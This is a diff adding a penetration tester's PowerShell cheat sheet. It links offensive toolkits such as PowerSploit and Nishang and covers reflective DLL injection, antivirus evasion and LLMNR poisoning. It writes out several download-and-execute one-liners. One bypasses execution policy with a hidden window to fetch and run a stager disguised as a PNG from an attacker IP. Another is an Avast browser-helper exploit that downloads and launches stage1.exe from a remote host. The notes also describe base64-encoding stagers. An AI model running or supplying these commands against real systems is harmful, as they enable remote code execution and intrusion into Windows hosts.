@@ -1,0 +1,74 @@
+# powershell
+
+http://pen-testing.sans.org/blog/2012/04/27/presentation-powershell-for-pen-testers
+
+http://code.google.com/p/nishang/
+https://github.com/mattifestation/PowerSploit and https://github.com/obscuresec/PowerSploit (contributor)
+
+https://github.com/darkoperator Posh-SecMod
+
+http://securitypadawan.blogspot.com.au/2013/07/authenticated-metasploit-payloads-via.html
+there also should be metasploit module also to fire up a reverse shell via powershell
+
+see ./bypass_av
+
+# recon
+* obtain list of Windows XP
+Get-ADComputer -filter {OperatingSystem -like "*XP*"}
+
+# port scan
+http://webstersprodigy.net/2013/07/01/powershell-portscanner/
+
+# learn
+http://mohd-akram.github.io/2013/05/16/a-python-developers-guide-to-powershell
+
+get-command or gcm (alias) # list all cmdlets
+
+# PowerSploit
+Import-Module .\PowerSploit
+Get-Command -Module PowerSploit
+Get-Help Invoke-ReflectivePEInjection
+
+# Reflective DLL Injection
+premiere version par Stephen Fewer
+amelioration par Joe Bialek
+incorpore dans PowerSploit
+
+# basics
+PS c:\> $psversiontable # if nothing comes back it's powershell v1
+or just run: get-host # works on all versions
+
+# remote
+WinRM / PowerShell Remoting service port 47001
+WinRM 5985 (HTTP) and 5986 (HTTPS)
+
+# complete security audit of Windows host
+http://poshcode.org/639
+
+# bypass Execution Policy
+https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy
+
+random blog: Set-ExecutionPolicy Unrestricted -force'
+michele: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('http://172.16.37.1/XYZ/ps.png')); Invoke-CICCIO.
+
+Carnal0wnage (http://carnal0wnage.attackresearch.com/2015/03/powershell-ad-recon-by-pyrotek3.html)
+powershell -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers'); Discover-PSMSSQLServers"
+
+Sometimes I also base64-encode the "stager" and use EncodedCommand.
+
+Nice read about this: http://www.exploit-monday.com/2014/04/powerworm-analysis.html
+
+As a payload, I recently switched to this (as it's automatically compatible with x86 and also x86_64 without the need for you to do fingerprinting):
+https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
+
+# Executes PowerShell from an unmanaged process
+https://github.com/leechristensen/UnmanagedPowerShell/tree/master
+
+# metasploit powershell session
+https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/
+
+# LLMNR/NBT-NS poisoning
+https://github.com/Kevin-Robertson/Inveigh
+
+# http://expertmiami.blogspot.com.au/2015/07/the-avast-series.html
+avastBHO.SwitchToSafezone('\\..\\..\\..\\..\\..\\..\\Windows\\system32\\cmd.exe /c "cd %TEMP%&PowerShell (New-Object System.Net.WebClient).DownloadFile(\'http://192.168.233.1:8001/stage1.exe\',\'stage1.exe\');(New-Object -com Shell.Application).ShellExecute(\'stage1.exe\');"')
